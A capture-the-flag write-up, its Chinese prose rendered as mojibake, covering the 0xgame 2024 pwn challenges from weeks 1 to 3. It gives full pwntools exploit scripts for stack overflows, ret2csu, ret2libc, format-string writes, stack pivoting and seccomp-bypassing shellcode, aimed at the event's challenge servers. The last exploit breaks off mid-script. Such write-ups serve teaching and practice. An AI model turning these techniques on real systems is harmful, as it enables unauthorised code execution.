# 0xgame 2024

![logo](../images/0.png)

ä¸€ä¸ªå¾ˆä¸é”™çš„æ–°ç”Ÿèµ›

# 0xgame week1

çœŸçš„å¾ˆç®€å•ï¼Œä¸€å¤©å°±æŠŠpwn week1ç»™akäº†ğŸ˜Š

#### ***[Week 1] 0. test your nc\***

å¤ªç®€å•äº†ï¼Œç•¥

#### ***[Week 1] 1. test your pwntools\***

å¤§æ¦‚å°±æ˜¯ï¼Œæ¥æ”¶æ”¶åˆ°çš„ç®—å¼ç„¶åç«‹åˆ»è¿”å›ç­”æ¡ˆï¼Œä¸Šä»£ç 

```
from pwn import *
io = remote('47.97.58.52',40010)
context.log_level = 'debug'   
while(1):
   io.recvuntil(b'=\n')
   result = io.recvuntil(b' = ',drop=True).decode().replace('\n','').replace('/','//')
   result = str(eval(result)).encode()
   io.sendline(result)
io.interactive()
```

#### ***[Week 1] 2. stack overflow\***

idaåç¼–è¯‘å¦‚ä¸‹ï¼š

<img src="http://www.leidongzheng.com/wp-content/uploads/2024/10/å›¾ç‰‡-9-1024x527.png" alt="img" style="zoom:50%;" />

æ³¨æ„è¯­å¥ signal(11,getflag); å…¶ä¸­getflagåªä¼šç»™ä½ åŠä¸ªflagï¼Œæ‰€ä»¥éœ€è¦ç»•è¿‡11å·æŠ¥é”™ï¼Œå³sigment faultã€‚åŠ ä¿©retæŒ‡ä»¤å°±å¯ï¼Œæ‰€ä»¥ä»£ç å¦‚ä¸‹ã€‚

```
from pwn import *
io = remote('47.97.58.52',40001)
elf = ELF('./pwn1')
context(os = 'linux',arch = 'amd64',log_level = 'debug')
io.recvuntil(b'her:\n')
io.send(b'A'*32 + p64(0x40101a) + p64(0x40101a) + p64(0x4012BD))
io.interactive()
```

#### ***[Week 1] 3. positive\***

<img src="http://www.leidongzheng.com/wp-content/uploads/2024/10/å›¾ç‰‡-10-1024x627.png" alt="img" style="zoom:50%;" />

æ˜¾ç„¶æ˜¯ä¸ªæ•´æ•°æº¢å‡ºé¢˜ï¼Œæº¢å‡ºæ•´æ•°bufä¸ºâ€˜-1â€™å› ä¸ºç±»å‹è½¬æ¢çš„é—®é¢˜nbytesæ¯”è¾ƒä¼šå¤±æ•ˆï¼Œé€ æˆæœ€åreadå‡½æ•°å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œç›´æ¥ç»™ä»£ç 

```
from pwn import *
io = remote('47.97.58.52',40002)
#io = process('./pwn2')
context(os = 'linux',arch = 'amd64',log_level = 'debug')
io.recvuntil(b'walk:\n')
io.send(b'-1')
#gdb.attach(io)
#pause()
io.recvuntil(b'walking:')
io.send(b'A'*56 +p64(0x40101a) + p64(0x40126A))
io.interactive()
```

#### ***[Week 1] 4. find_me\***

mainå‡½æ•°å¦‚ä¸‹

<img src="http://www.leidongzheng.com/wp-content/uploads/2024/10/å›¾ç‰‡-11-1024x681.png" alt="img" style="zoom:50%;" />

do_bad()å‡½æ•°å¦‚ä¸‹

![img](http://www.leidongzheng.com/wp-content/uploads/2024/10/å›¾ç‰‡-12-1024x687.png)

é€šè¿‡æ—¶é—´ä¸ºç§å­ç”Ÿæˆéšæœºæ•°ï¼Œæ‰“å¼€v4æ¬¡fake_flagï¼Œæ¯æ¬¡æ‰“å¼€éƒ½ä¼šä½¿æ–°äº§ç”Ÿçš„æ–‡ä»¶æè¿°ç¬¦å¢åŠ 1ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç»•è¿‡éšæœºæ•°ï¼Œç„¶ååœ¨do_bad()å‡½æ•°ä¸­ï¼Œå°†æ­£ç¡®çš„æ–‡ä»¶æè¿°ç¬¦â€œæ‰¾å‡ºæ¥â€ï¼Œå°†flagå†™å…¥&whatï¼Œå†ä»&whatè¯»å‡ºæ¥

è¿™æ—¶å€™éœ€è¦ç”¨åˆ°ctypesåº“äº†

ctypes æ˜¯Pythonçš„å¤–éƒ¨å‡½æ•°åº“ã€‚å®ƒæä¾›äº†Cå…¼å®¹ æ•°æ®ç±»å‹ï¼Œå¹¶å…è®¸è°ƒç”¨ DLL æˆ–å…±äº«åº“ä¸­çš„å‡½æ•°ã€‚å®ƒå¯ä»¥æ˜¯ ç”¨äºå°†è¿™äº›åº“åŒ…è£…åœ¨çº¯Pythonä¸­.

æˆ‘ä»¬ä½¿ç”¨è¯­å¥

```
libc = cdll.LoadLibrary('libc.so.6')#è¿™é‡Œçš„libc.so.6åº”è¯¥å¯ä»¥ä¸æ˜¯å›ºå®šçš„ï¼Œåªè¦è§£å†³é—®é¢˜ç”¨å“ªä¸ªéƒ½è¡Œã€‚
```

è¿™è¡Œä»£ç ä½¿ç”¨ ctypes åº“ä¸­çš„ cdll.LoadLibrary å‡½æ•°åŠ è½½äº† /bin/x86_64-linux-gnu/libc.so.6 è·¯å¾„ä¸‹çš„å…±äº«åº“ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™äº†å˜é‡ libcã€‚è¿™æ ·ï¼Œä½ å°±å¯ä»¥ä½¿ç”¨ libc å˜é‡æ¥è®¿é—®è¯¥å…±äº«åº“ä¸­çš„å‡½æ•°ã€‚
***ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬èƒ½ç”¨pythonä»£ç è°ƒç”¨libcä¸­çš„å‡½æ•°\***ï¼Œé‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ï¼Œ***åªè¦æˆ‘ä»¬æ¨¡ä»¿ç¨‹åºé‡Œçš„ä»£ç ï¼Œå°±å¯ä»¥ç”Ÿæˆå‡ºåŒæ ·çš„éšæœºæ•°ï¼Œæ¥è¾¾åˆ°â€œç›¸åŒçš„éšæœºæ•°â€çš„æ•ˆæœï¼Œâ€œæ‰¾åˆ°â€éœ€è¦çš„flag\***

ä»£ç å¦‚ä¸‹

```
from pwn import *
from ctypes import *
io = remote('47.97.58.52',40003)
#io = process('./pwn4')
elf = ELF('./pwn4')
context(os = 'linux',arch = 'amd64',log_level = 'debug')
libc = cdll.LoadLibrary('libc.so.6')
libc.srand(libc.time(0))
a = libc.rand()
b = a%100
b = b + 3
io.sendline(b'0')
sleep(0.3)
io.sendline(str(b).encode())
sleep(0.3)
io.sendline(b'1')
sleep(0.3)
io.sendline(b'2')
io.interactive()
```

#### ***[Week 1] 5. where_is_my_binsh\***

å¾ˆç®€å•çš„æ ˆæº¢å‡º

```
from pwn import *
#io = process('./pwn3')
io = remote('47.97.58.52',40004)
elf = ELF('./pwn3')
sys_plt = elf.plt['system']
binsh_addr = 0x404090
pop_rdi_ret = 0x401323
io.send(b'/bin/sh\x00')
io.send(b'A'*24 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(0x40101a) + p64(sys_plt))
io.interactive()
```

#### ***[Week 1] 6. ret2csu\***

![img](http://www.leidongzheng.com/wp-content/uploads/2024/10/å›¾ç‰‡-13-1024x548.png)

![img](http://www.leidongzheng.com/wp-content/uploads/2024/10/å›¾ç‰‡-14-1024x388.png)

é¢˜ç›®ä¸­å‘ç°äº†execveçš„gotè¡¨

ret2csuå°±æ˜¯ç”¨loc_4013B6çš„gadgetå°†éœ€è¦çš„å‚æ•°å‹å…¥r12,r13,r14,r15

å…¬å¼æ˜¯ï¼šrbx=0, rbp=1, r12=args1, r13=args2, 

r14=args4, r15=execve.got, last = loc_4013A0

è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡loc_4013B6å’Œloc_4013A0è°ƒç”¨execveå‡½æ•°äº†

```
from pwn import *
#io = process('./pwn5')
io = remote('47.97.58.52',40005)
elf = ELF('./pwn5')
io.send(b'/bin/sh\x00')
payload = b'A'*14 + b'\x00'*2 + b'B'*8 + p64(0x4013BA) + p64(0) + p64(1) + p64(0x404090) + p64(0) + p64(0) + p64(0x404038) + p64(0x4013A0) + b'A'*56
#gdb.attach(io)
#pause()
io.send(payload)
io.interactive()
```

# 0xgame week2

éš¾åº¦ä¸Šæ¥ä¸€ç‚¹ç‚¹ï¼Œç¡®å®é‡åˆ°äº†æ£˜æ‰‹ä¸€ç‚¹çš„é¢˜ï¼Œä¸»è¦æ˜¯ä»£ç æ€»æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆå°±æŠ¥é”™ï¼Œè¿™ä¹Ÿç®—æˆ‘çš„ä¸€ä¸ªç—›ç‚¹æŠŠ

#### [Week 2] Shellcode-lv0

<img src="http://www.leidongzheng.com/wp-content/uploads/2024/10/å›¾ç‰‡-15-1024x632.png" alt="img" style="zoom:50%;" />

å…¶å®è¿™ä¸ªéšæœºæ•°æ²¡å•¥ç”¨ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨payloadå³è¾¹å¡«æ»¡\x90(NOPï¼‰ï¼Œè¿™æ ·ç¨‹åºæ‰§è¡Œæµå°±ä¼šè¢«â€œæ»‘ä¸‹æ¥â€ï¼Œå¤šè¯•å‡ æ¬¡å°±é€šäº†

```
from pwn import *
context(os='linux',arch='amd64')
#io = process('./pwn00')
io = remote('47.97.58.52',42012)
payload = asm(shellcraft.amd64.sh())
print(len(payload))
payload = payload.rjust(0x100,b'\x90')
io.send(payload)
#gdb.attach(io)
#pause()
io.interactive()
```

#### [Week 2] Shellcode-lv1

<img src="http://www.leidongzheng.com/wp-content/uploads/2024/10/å›¾ç‰‡-16-1024x607.png" alt="img" style="zoom:50%;" />

ä¸èƒ½ä½¿ç”¨execveï¼Œä½†æ˜¯å¯ä»¥ORWä¸€æŠŠæ¢­

<img src="http://www.leidongzheng.com/wp-content/uploads/2024/10/Screenshot-from-2024-10-17-19-53-22.png" alt="img" style="zoom:80%;" />

```
from pwn import *
#io = process('./shellcode_1')
io = remote('47.97.58.52',42013)
context(os='linux',arch='amd64',log_level='debug')
addr = 0x20240500
payload = shellcraft.amd64.open("./flag")
payload += shellcraft.amd64.read(3,addr,0x30)
payload += shellcraft.amd64.write(1,addr,0x30)
print(len(payload))
payload = asm(payload)
payload = payload.rjust(0x100,b'\x90')
io.send(payload)
io.interactive()
```

#### [Week 2] ez_format

<img src="http://www.leidongzheng.com/wp-content/uploads/2024/10/å›¾ç‰‡-17.png" alt="img" style="zoom:50%;" />

å› ä¸ºè¿™é“é¢˜å¼€äº†pieï¼Œæ‰€ä»¥æ²¡æ³•ç›´æ¥è¯»å–flagçš„å†…å®¹ï¼Œéœ€è¦æ³„éœ²æ ˆé‡Œåœ°å€å¹¶ä¸”åŠ ä¸Šåç§»æ¥å¾—åˆ°&flagçš„æ•°å€¼ï¼Œå› ä¸ºå¾ˆç®€å•ï¼Œæ‰€ä»¥ç›´æ¥ä¸Šä»£ç 

```
from pwn import *
#io = process('./pwn22')
io = remote('47.97.58.52',42001)
context(os = 'linux',arch = 'amd64',log_level = 'debug')
#gdb.attach(io)
#pause()
io.send(b'%9$p')
io.recvuntil(b'Shanghai!\n')
a = int(io.recv(14).decode(),16)
print(hex(a))
addr = a - 0x1140 + 0x40c0
print(hex(addr))
payload = b'%7$s'.ljust(8,b'\x00')
io.sendafter(b'something:',payload + p64(addr))
flag = io.recv()
print(flag)
io.interactive()
```

#### [Week 2] fmt2shellcode

<img src="http://www.leidongzheng.com/wp-content/uploads/2024/10/å›¾ç‰‡-18.png" alt="img" style="zoom:50%;" />

å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬éœ€è¦æ»¡è¶³key==26318864è¿™ä¸ªæ¡ä»¶æ‰èƒ½å¾—åˆ°shellï¼Œä½†æ˜¯æœ‰å‡ ä¸ªé—®é¢˜

1.è¿™é¢˜å¼€äº†pieï¼ˆéœ€è¦æå‰æ³„éœ²æ ˆå†…çš„åœ°å€

2.readä¸€æ¬¡è¯»å–0x20ä¸ªæ•°æ®ï¼ˆä»£è¡¨æ²¡æ³•ç”¨fmtstr_payloadä¸€æŠŠæ¢­ï¼Œéœ€è¦æ‰‹æ“

3.è¯¸å¦‚%xxxc%y$nçš„é•¿åº¦è¶…è¿‡äº†8ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œéœ€è¦å°†åœ°å€æ”¾åœ¨åé¢ä¸¤ä¸ªå­—é•¿çš„åç§»è€Œä¸æ˜¯ä¸€ä¸ªå­—é•¿

æ‰€ä»¥ä»£ç å¦‚ä¸‹

```
from pwn import *
#io = process('./fmt20')
io = remote('47.97.58.52',42002)
context(os = 'linux',arch='amd64',log_level = 'debug')

io.sendafter(b'something:',b'%9$p')
io.recvuntil(b'Shanghai!\n')
a = int(io.recv(14).decode(),16)
addr = a - 0x1140 + 0x4068
print(hex(addr))
keys = 0x1919810 
#gdb.attach(io)
#pause()
payload = b'%16c%8$hhn'.ljust(16,b'\x00') + p64(addr)
io.sendlineafter(b'something:',payload)

payload = b'%152c%8$hhn'.ljust(16,b'\x00') + p64(addr+1)
io.sendlineafter(b'something:',payload)

payload = b'%145c%8$hhn'.ljust(16,b'\x00') + p64(addr+2)
io.sendlineafter(b'something:',payload)

payload = b'%1c%8$hhn'.ljust(16,b'\x00')  + p64(addr+3)
io.sendlineafter(b'something:',payload)
payload = b'%7$s'.ljust(8,b'\x00')
io.sendafter(b'something:',payload + p64(addr))
io.sendafter(b'something:',b'stop\x00')
payload1 = asm(shellcraft.amd64.sh())
io.send(payload1)
io.interactive()
```

#### [Week 2] ret2libc

<img src="http://www.leidongzheng.com/wp-content/uploads/2024/10/å›¾ç‰‡-19.png" alt="img" style="zoom: 67%;" />

å…ˆæ³„éœ²puts.got,ç„¶åæ‰“ret2libc

```
from pwn import *
#io = process('./pwn11')
io = remote('47.97.58.52',42003)
context(os='linux',arch='amd64',log_level = 'debug')
elf = ELF('./pwn11')
libc = ELF('libc.so.6')

pop_rdi_ret = 0x4012c3
vuln = 0x401205
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
ret = 0x40101a

payload = b'A'*40 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)
io.send(payload)
io.recvuntil(b'?\n')
puts_addr = u64(io.recv(6).ljust(8,b'\x00'))
print(hex(puts_addr))
libc_b = puts_addr - libc.symbols['puts']
sys_a = libc_b + libc.symbols['system']
bin_a = libc_b + next(libc.search(b"/bin/sh\x00"))
#gdb.attach(io)
#pause()
payload = b'A'*40 + p64(ret) + p64(pop_rdi_ret) + p64(bin_a) + p64(sys_a)
io.send(payload)
io.interactive()                   
```

#### [Week 2] boom

<img src="http://www.leidongzheng.com/wp-content/uploads/2024/10/å›¾ç‰‡-20.png" alt="img" style="zoom:50%;" />

çˆ†ç ´æ³•ï¼Œstrcmpä¼šè¢«00æˆªæ–­ï¼Œæˆ‘ä»¬å¯ä»¥å†™è„šæœ¬çˆ†ç ´è¿™ç§æƒ…å†µ,ç¬¬ä¸€æ¬¡åšè¿™ç§é¢˜ï¼Œæ„Ÿè§‰è¿˜æŒºå¥½ç©çš„

```
from pwn import *
def h():
   io.recvuntil(b'thinking?\n')
   io.send(b'\x00'*0x31)
   a = io.recv()
   print(a)
   if b'WOW' in a:
      io.interactive()

while True:
    try:
       io = remote('47.97.58.52',42000)
       h()
    except:
       io.close()
```
![logo](../images/14.png)

#### [Week 2] SROP

è¿™é¢˜ä¹‹åä¼šæ”¾åœ¨SROPæ ç›®é‡Œè®²è§£

#### [Week 2] Syscall playground

<img src="http://www.leidongzheng.com/wp-content/uploads/2024/10/å›¾ç‰‡-21-1024x684.png" alt="img" style="zoom: 67%;" />

<img src="http://www.leidongzheng.com/wp-content/uploads/2024/10/å›¾ç‰‡-22-1024x677.png" alt="img" style="zoom:67%;" />

<img src="http://www.leidongzheng.com/wp-content/uploads/2024/10/å›¾ç‰‡-23-1024x256.png" alt="img" style="zoom:67%;" />

å¦‚ä¸Šå›¾ï¼Œç›´æ¥æŠŠ/bin/sh\x00å†™å…¥bufferç„¶åæ‰§è¡Œexecve(buf_addr,0,0)å³å¯

```
from pwn import *
#io = process('./syscall')
io = remote('47.97.58.52',42010)
context(os = 'linux',arch = 'amd64',log_level = 'debug')

io.sendlineafter(b'choice: ',b'1')
io.recvuntil(b' located at ')
addr = int(io.recvuntil(b'\n',drop = True).decode(),16)
print(addr)
io.sendlineafter(b'Input your data: ',b'/bin/sh\x00')

io.sendlineafter(b'choice: ',b'3')
io.sendlineafter(b'call: ',b'59')
io.sendlineafter(b'Input the arguments count: ',b'3')
io.sendlineafter(b'Input the argument 0:',str(addr).encode())
io.sendlineafter(b'Input the argument 1:',b'0')
io.sendlineafter(b'Input the argument 2:',b'0')
io.interactive()                
```

æ€»ç»“ï¼šå…¶å®week2è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œä½†ä¹Ÿç¡®å®æœ‰äº›å¾ˆéš¾è§åˆ°çš„é¢˜å‹

# 0xgame week3

week3çœŸçš„ä¸Šéš¾åº¦äº†ï¼Œçœ‹ä¸€ä¸Šåˆæœ‰å¤´ç»ªçš„ä¿©é¢˜è¿›åº¦éƒ½ä¸å¿«ï¼Œè¿˜æœ‰ä¸€ä¸ªé¢˜æ˜¯å…³äºéæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ï¼Œå¤ªå¤æ‚äº†æˆ‘ç”šè‡³éƒ½ä¸æƒ³çœ‹

#### [Week 3] where_is_my_stack

è®©æˆ‘æƒ³åˆ°äº†moeçš„travel of stacké‚£é¢˜ã€‚æ‰€ä»¥ä¸´æ—¶ç¿»äº†ä¸€ä¸‹moeçš„é¢˜è§£ï¼Œç»ˆäºææ˜ç™½äº†,è¿™é¢˜æ˜¯å…³äºå¤šæ¬¡æ ˆè¿ç§»çš„ã€‚

ä»€ä¹ˆæ˜¯å¤šæ¬¡æ ˆè¿ç§»ï¼Œå¦‚ä½•å¤šæ¬¡æ ˆè¿ç§»å‘¢ï¼Ÿæˆ‘ä»¬éœ€è¦åˆ©ç”¨readå‡½æ•°çš„æ±‡ç¼–ä»£ç æ¥åˆ†æï¼š
***å¤šæ¬¡æ ˆè¿ç§»ä¸€èˆ¬ç”¨äºéœ€è¦æ³„éœ²libcåœ°å€æˆ–è€…åªæœ‰ä¸€æ¬¡è¾“å…¥çš„æ—¶å€™\***

![logo](../images/17.png)

æˆ‘ä»¬å¯ä»¥çœ‹åˆ°readçš„ç¬¬äºŒä¸ªå‚æ•°rsiæ˜¯ç”±raxèµ‹å€¼çš„ï¼Œrsiåº”è¯¥å­˜å‚¨æˆ‘ä»¬bufçš„åœ°å€ï¼Œè€Œè¿™ä¸ªbufåœ°å€æ˜¯ç”±***lea rax,[rbp + buf]\***ç¡®å®šçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œ***æˆ‘ä»¬bufå­˜å‚¨æˆ‘ä»¬è¾“å…¥çš„åœ°å€æ˜¯ç”±rbpç¡®å®šçš„ï¼\***

é‚£ä¹ˆå¦‚æœæˆ‘ä»¬ç¬¬ä¸€æ¬¡ä¼ å…¥payload0=padding + bss_fake_stack + read_addr

æˆ‘ä»¬çš„rbpä¼šè¢«ç§»åŠ¨åˆ°bss_fake_stack,è€Œrspä¾æ—§åœç•™åœ¨æ ˆå†…ï¼Œæ¥ä¸‹æ¥ç¨‹åºä¼šè°ƒç”¨readï¼Œè€Œreadå­˜å‚¨æˆ‘ä»¬è¾“å…¥çš„åœ°å€buf_addråˆæ˜¯ç”±rbpå†³å®šï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬çš„è¾“å…¥ä¼šè¢«æ”¾åœ¨bssæ®µå†…ï¼Œæ¥ä¸‹æ¥æ‰§è¡Œå®Œreadåè¿˜ä¼šæ‰§è¡Œleave_retï¼Œè€Œæˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯æŠŠrbpå†æ¬¡è¿ç§»åˆ°æˆ‘ä»¬è¾“å…¥çš„ä»£ç ä¸­è¿›è¡Œã€‚ä¸‹é¢æ”¾ä¸€ä¸ªæ¿å­

```
payload 0 = padding + bss_addr + read_addr
paylaod n = next_rbp(addr1) + shellcode + padding + read_addr + addr1(bss_addr) + leave_ret_addr
```

åˆ†æï¼š

1.payload0ä¼šæŠŠrbpé€åˆ°bss_addr,è€Œrspä¾æ—§åœç•™åœ¨æ ˆå†…

2.æ‰§è¡Œå®Œreadå‡½æ•°årbpè¢«å¼¹åˆ°æˆ‘ä»¬è¾“å…¥åˆ°bss_addrå¤„çš„addr1ï¼Œè€Œrspè¢«ç§»åŠ¨åˆ°bss_addr,ç´§æ¥ç€æ‰§è¡Œæˆ‘ä»¬ä¼ å…¥çš„leave-ret-addrä½¿rbpè¢«ç§»åŠ¨åˆ°next_rbpï¼Œrspåˆå†æ¬¡ç§»åŠ¨åˆ°ä¹‹å‰rbpçš„ä½ç½®+1å³&shellcodeï¼Œç„¶åæ‰§è¡Œæˆ‘ä»¬çš„shellcodeè¿›è€Œå†é€šè¿‡readè¿›è¡Œä¸‹ä¸€æ¬¡è·³è½¬

äºæ˜¯æˆ‘ä»¬æ¥çœ‹é¢˜ï¼Œvulnå‡½æ•°å¦‚ä¸‹ï¼šreturn read(0,buf,0x30uLL);

![logo](../images/18.png)

è¿™é“é¢˜çš„éš¾ç‚¹ä¸»è¦åœ¨readåªè¯»å…¥0x30å­—èŠ‚

æŒ‰ç…§æ­£å¸¸æ³„éœ²åœ°å€çš„æµç¨‹ï¼š

payload = next_rbp + pop_rdi_ret + puts_got + puts_plt + read_addr + bss-0x20 + leave_retä¸€å…±ä¼šæœ‰0x38ä¸ªå­—èŠ‚ã€‚

ç»è¿‡ç½‘ä¸Šä¿¡æ¯æ£€ç´¢å’Œå‡ºé¢˜äººçš„æç¤ºï¼ŒåŸæ¥è¿™é¢˜å¯ä»¥é€šè¿‡å¾€ä¸Šè¿ç§»å…«å­—èŠ‚æ¥å†™å…¥

æˆ‘ä»¬å¯ä»¥å¤šæ„é€ ä¸€æ¬¡readå‡½æ•°æ¥æ ˆè¿ç§»ï¼Œè¿™æ¬¡æ ˆè¿ç§»çš„æ•ˆæœä¸»è¦æ˜¯å°†readè®¡ç®—çš„bufå¾€ä¸ŠæŠ¬8å­—èŠ‚ï¼Œå¦‚ä¸‹

***(bss_fake_stcak+8)+ read_addr + ret + ret + bss-0x20 + leave_ret\***

è¿™æ ·ï¼Œrbpä¼šè¢«è¿ç§»åˆ°bss_fake_stack+8,è€Œä¸‹æ¬¡è¯»å…¥çš„&buf2 = &buf1 + 8ï¼Œæˆ‘ä»¬è¾“å…¥çš„ç¬¬ä¸€ä¸ªå­—é•¿ä¼šåœ¨ä¹‹å‰çš„read_addrå¤„ï¼

ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥ä¸ä¼ å…¥bss_fake_stack(ä¹Ÿå°±æ˜¯æ¿å­é‡Œçš„next_rbp,è¿™æ ·å°±å¯ä»¥å°‘å†™ä¸€ä¸ªå­—é•¿

æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç»™å‡ºä»£ç ï¼ï¼ï¼

```
from pwn import *
io = process('./pwn')
#io = remote('47.97.58.52',43001)
elf = ELF('./pwn')
libc = ELF('libc.so.6')
context(os = 'linux',arch ='amd64',log_level = 'debug')
puts_got = 0x404018
puts_plt = 0x401070
leave_ret = 0x401234
pop_rdi = 0x4012c3
ret = 0x40101a
bss = 0x404800
read = 0x40121D
payload = b'a'*0x20 + p64(bss) + p64(read)
gdb.attach(io)
pause()
io.sendafter(b'but not stack ~\n',payload)
payload1 = p64(bss+0x8) + p64(read) + p64(0)*2+ p64(bss-0x20) + p64(leave_ret)
io.send(payload1)
payload2 =p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +p64(read) + p64(bss-0x20) + p64(leave_ret)
io.send(payload2)
k = u64(io.recvuntil(b'\n',drop = True).ljust(8,b'\x00'))
print(hex(k))
libc_base = k - libc.symbols['puts']
sys_addr = libc_base + libc.symbols['system']
bin_addr = libc_base + next(libc.search(b"/bin/sh\x00"))
payload3 = p64(ret)*3 + p64(pop_rdi) + p64(bin_addr)  + p64(sys_addr)
io.send(payload3)
io.interactive()
```

ç»è¿‡gdbè°ƒè¯•ï¼Œå‘ç°æœ€årspåœ¨0x404800(æˆ‘ä¹Ÿä¸æ¸…æ¥šä¸ºä»€ä¹ˆï¼‰,æ‰€ä»¥payload3éœ€è¦å¡«å……3ä¸ªret ,æ‰€ä»¥å¤šæ¬¡æ ˆè¿ç§»çœŸçš„ååˆ†ä¾èµ–gdbçš„è°ƒè¯•ã€‚

#### [Week 3] Shellcode-lv2

ä»è¿™é¢˜çœ‹å‡ºæ¥æˆ‘çš„shellcodeç¼–å†™èƒ½åŠ›å®åœ¨å·®åŠ²ã€‚ã€‚ã€‚

é¢˜ç›®é€»è¾‘å¦‚ä¸‹ï¼Œè¾“å…¥çš„å†…å®¹ä¸­ä¸èƒ½åŒ…å«\xf\x5ä¹Ÿå°±æ˜¯æŒ‡ä»¤syscallã€‚

é¦–å…ˆå…ˆè€ƒè™‘è¿™é¢˜å¦‚ä½•åšï¼Œçœ‹åˆ°é¢˜ç›®å¼€äº†æ²™ç®±ï¼Œåªèƒ½ä½¿ç”¨ORWï¼Œä½†æ˜¯10å­—èŠ‚è‚¯å®šä¸å¤Ÿæ‰§è¡ŒORWï¼Œæ‰€ä»¥è¦å…ˆæ„é€ ä¸€æ¬¡readè¯»å…¥shellcodeï¼Œshellcodeå°±å­˜åœ¨ä¹‹åçš„bufé‡Œç»§ç»­æ‰§è¡Œ

![logo](../images/19.png)

ä½†æ˜¯syscallè¢«ç¦äº†ï¼Œå¦‚ä½•ç»•è¿‡å‘¢ï¼Ÿäºæ˜¯æœ‰ä»¥ä¸‹æ–¹æ³•ï¼š

1.æ„é€ ä¸€ä¸ª0xf05(é€šè¿‡è¿ç®—å¾—å‡ºï¼‰ï¼Œå¹¶å°†å…¶å‚¨å­˜åœ¨å¯„å­˜å™¨ä¸­ï¼Œæœ€åcall è¿™ä¸ªå¯„å­˜å™¨ã€‚

2.åˆ©ç”¨mov byte ptr [addr],5å°†5å†™å…¥bufä¹‹åçš„å†…å­˜

3.ä½¿ç”¨int 0x80

ç”±äºç¬¬ä¸€æ¬¡è¯»å…¥çš„æ•°æ®å¤ªå°‘äº†åªæœ‰0x10ï¼Œæ‰€ä»¥è€ƒè™‘ç”¨æ–¹æ³•äºŒï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ª15å­—èŠ‚é•¿çš„shellcodeï¼Œç„¶åå†å•ç‹¬æŠŠ\x0fä¼ è¿›å»ï¼Œæœ€åmov byte ptr [addr],5ä¼šå°†\x05ä¹Ÿå†™è¿›å»è¾¾åˆ°æ”»å‡»ç›®çš„ã€‚

<img src="http://www.leidongzheng.com/wp-content/uploads/2024/10/å›¾ç‰‡-38-1024x645.png" alt="img" style="zoom:67%;" />

äºæ˜¯æˆ‘ä»¬å¯ä»¥ç»™å‡ºexploitï¼š

```
from pwn import *
#io = process('./pwn1')
io = remote('47.97.58.52',43010)
elf = ELF('./pwn1')
context(os = 'linux',arch = 'amd64')
read_shell = """
xor rdi, rdi
mov rsi,0x20240011
nop
mov byte ptr[rdx+16],5
"""
#gdb--rax=0,rdx=0x20240000
print(len(asm(read_shell)))
payload = asm(read_shell) + b'\x0f'
#gdb.attach(io)
#pause()
io.sendafter(b'Show me what you want to run: ',payload)
addr = 0x20240500
payload1 = shellcraft.amd64.open("./flag")
payload1 += shellcraft.amd64.read(3,addr,0x30)
payload1 += shellcraft.amd64.write(1,addr,0x30)
io.send(asm(payload1))
io.interactive()               
```

#### [Week 3] fmt2orw

ä¸»å‡½æ•°é€»è¾‘
![logo](../images/21.png)

say()ï¼š
![logo](../images/22.png)

seccompè§„åˆ™ï¼šåªå…è®¸openï¼Œreadï¼Œwriteï¼Œmprotect


æ‰€ä»¥è¿™é¢˜è¯¥æ€ä¹ˆæ‰“å‘¢ã€‚ã€‚ã€‚åŸæ¥æ˜¯éæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå…·ä½“çŸ¥è¯†ç‚¹å°±ä¸ä»‹ç»äº†ï¼Œéæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²è¿˜æ˜¯å¾ˆå¥½ç†è§£çš„ï¼Œå°±æ˜¯æ²¡æ³•ä»»æ„åœ°å€å†™å’Œä»»æ„åœ°å€è¯»ã€‚

è¿™é¢˜éœ€è¦åšçš„æ˜¯orwï¼Œä½†æ˜¯bufåˆæ²¡æ‰§è¡Œæƒé™ï¼Œä½†æ˜¯æˆ‘ä»¬çœ‹åˆ°ç¨‹åºé‡Œæœ‰ï¼š

![logo](../images/23.png)

ä½†æ˜¯è¿™é¢˜å¼€äº†pieï¼Œå› æ­¤åšé¢˜æ­¥éª¤å°±å¾ˆæ¸…æ™°äº†ï¼š

å…ˆæ­é“¾å­==>æ³„éœ²mainåœ°å€==>æŠŠret_addræ”¹ä¸ºwhat_addr==>æŠŠä¸‹ä¸€ä¸ªå­—èŠ‚æ”¹ä¸ºshellcodeçš„åœ°å€ï¼Œæœ€åç›´æ¥ä¼ å…¥stop + shellcodeè¾¾æˆæ”»å‡»ï¼Œexpå¦‚ä¸‹ï¼š

```
from pwn import *
#io = process('./fmt2')
io = remote('47.97.58.52',43000)
context(os = 'linux',arch = 'amd64',log_level = 'debug')
io.sendafter(b'Say something:',b'%11$p')
io.recvuntil(b'Shanghai!\n0x')
addr = int(io.recvuntil(b'Shanghai!\n',drop=True).decode(),16)
ret_a = addr - 0xe08 + 0xd08
print(hex(ret_a))
io.sendafter(b'Say something:',b'%7$p')
io.recvuntil(b'Shanghai!\n0x')
addr = int(io.recv(12).decode(),16)
what = addr - 0x50 -0x151 +  0xA3
print(hex(what))
payload1 = b'%' + str(ret_a & 0xffff).encode() + b'c%11$hn' + b'\x00'
#gdb.attach(io)
#pause()
io.sendafter(b'Say something:',payload1)
